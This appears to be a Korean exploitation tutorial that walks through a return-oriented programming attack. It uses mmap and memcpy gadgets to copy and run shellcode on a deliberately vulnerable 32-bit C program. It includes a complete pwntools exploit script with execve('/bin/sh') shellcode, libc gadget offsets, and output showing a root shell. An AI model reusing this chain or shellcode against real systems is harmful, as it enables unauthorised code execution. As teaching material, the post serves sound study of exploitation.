---
title: Return-Oriented Programming with mmap
author: Beomsu Lee
category: [Exploitation, Stack]
tags: [exploitation, stack, return-oriented programming, x64]
math: true
mermaid: true
---

## Description

ROP를 통해 메모리 영역 할당(mmap)하거나 할당된 메모리 영역의 권한을 변경(mprotect)하여 공격하는 방법이다.

## Proof of concept

```c
// Vuln Code
// gcc -m32 -fno-stack-protector -o rop rop.c -ldl
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
  
void vuln(){
    char buf[50];
    void (*printf_addr)() = dlsym(RTLD_NEXT, "printf");
    printf("Printf() address : %p\n",printf_addr);
    read(0, buf, 256);
}
 
void main(){
    write(1,"Hello ROP\n",10);
    vuln();
}
```

“A”*66을 입력해 Overflow가 가능하다.

```
gdb-peda$ x/24wx $ebp
0xbffff538: 0x41414141  0x0804850a  0xb7fb63dc  0xbffff560
```

POPAD: 스택에 존재하는 값을 EAX, ECX, EDX, EBX, ESP, EBP, ESI, EDI 레지스터에 저장

```
gdb-peda$ x/24wx $esp
0xbfdfca50: 0x41414141  0x42424242  0x43434343  0x44444444
0xbfdfca60: 0x45454545  0x46464646  0x47474747  0x48484848
```

이 상태에서 POPAD할 경우 다음과 같이 레지스터에 저장된다.

```
EAX: 0x48484848 ('HHHH')
EBX: 0x45454545 ('EEEE')
ECX: 0x47474747 ('GGGG')
EDX: 0x46464646 ('FFFF')
ESI: 0x42424242 ('BBBB')
EDI: 0x41414141 ('AAAA')
EBP: 0x43434343 ('CCCC')
ESP: 0xbfdfca70 ("IIIIlg۷n313337277")
```

PUSHAD: EAX, ECX, EDX, EBX, ESP, EBP, ESI, EDI 순으로 레지스터의 값을 스택에 저장

위와 같이 POPAD 한 상태에서 PUSHAD 한 경우의 esp의 결과를 확인한다.

```
gdb-peda$ x/24wx $esp
0xbfe351f4: 0x41414141  0x42424242  0x43434343  0xbfe35214
0xbfe35204: 0x45454545  0x46464646  0x47474747  0x48484848
```

## Exploit plan

1. mmap() 함수를 이용하여 새로운 메모리 영역 할당
2. POPAD gadget에 의해 memcpy() 함수 주소가 저장된 영역으로 이동
    - Libc의 memcpy() 함수는 exploit code에서 사용할 memory 값을 복사할 수 없음
    - memcpy() 함수는 CPU가 지원하는 streaming SIMD 확장에 맞는 함수의 주소값을 리턴(EAX에 저장됨)
3. XCHG EAX,EDI gadget에 의해 리턴받은 __memcpy_sse2_unaligned() 함수의 주소를 EDI 레지스터에 저장
4. POP ESI Gadget에 의해 memcpy()함수 호출 후 이동할 return address를 ESI 레지스터에 저장
5. POP EBP Gadget에 의해 1번째 인자 값을 EBP 레지스터에 저장
6. POP EBX Gadget에 의해 3번째 인자 값을 EBX 레지스터에 저장
7. PUSHAD Gadget에 의해 레지스터에 저장된 값들을 stack 에 저장하고 0x1028 영역(0x1048 - (0x4 * 레지스터 개수(8))으로 이동
    - 2 번째 인자 값은 ESP 레지스터에 저장되어 있기 때문에 별도의 조작이 필요하지 않음
8. 0x1028 영역에서 memcpy() 함수로 인해 stack에 저장된 shellcode가 mmap()에 의해 생성된 메모리 영역으로 복사
9. memcpy() 함수가 종료되면 mmap()에 의해 생성된 메모리 영역으로 이동하여 shellcode를 실행
    - 해당 영역은 RWX 권한이 설정되어 있기 때문에 shellcode 실행이 가능

## Exploit code

```python
# Exploit Code
from pwn import *

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

binary = ELF('./rop')
libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
p=process('./rop')
#gdb.attach(p)
p.recvline()
printf_addr = int(p.recvline().split()[3],16)

print('printf_addr: '+str(printf_addr))

libBase = printf_addr - 0x49670
libc_mmap = libBase + libc.symbols['mmap']
libc_memcpy = libBase + libc.symbols['memcpy']

libc_popad_ret = libBase + 0x0016b802
libc_pushad_ret = libBase + 0x0000c76c
libc_xchg_eax_edi = libBase + 0x000f5c6b
libc_pop_esi = libBase + 0x00124c3f
libc_pop_ebp = libBase + 0x00136d43
libc_pop_ebx = libBase + 0x00143fe3

new_mem = 0x20000000

payload = "A"*66
# mmap(new_mem,0x1000,0x7,0x22,0xffffffff,0)
payload += p32(libc_mmap)
payload += p32(libc_popad_ret)
payload += p32(new_mem)
payload += p32(0x1000)
payload += p32(0x7)
payload += p32(0x22)
payload += p32(0xffffffff)
payload += p32(0)
payload += 'AAAA'*2

# memcpy(new_mem,'address of shellcode',len(shellcode))
payload += p32(libc_memcpy)
payload += p32(libc_xchg_eax_edi)
payload += p32(libc_pop_esi)
payload += p32(new_mem)
payload += p32(libc_pop_ebp)
payload += p32(new_mem)
payload += p32(libc_pop_ebx)
payload += p32(len(shellcode))
payload += p32(libc_pushad_ret)
payload += shellcode

#raw_input("1")
p.sendline(payload)
p.interactive()
```

## Exploit

```bash
root@bs-virtual-machine:~/test# python exploit.py 
[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
[*] '/root/test/rop'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] '/lib/i386-linux-gnu/libc-2.23.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './rop': pid 4854
printf_addr: 3084265072
[*] Switching to interactive mode
$ 
$ id
uid=0(root) gid=0(root) groups=0(root)
```

## Refereces
- [03.ROP(Return Oriented Programming) - mmap, mprotect](https://www.lazenca.net/display/TEC/03.ROP%28Return+Oriented+Programming%29+-+mmap%2C+mprotect)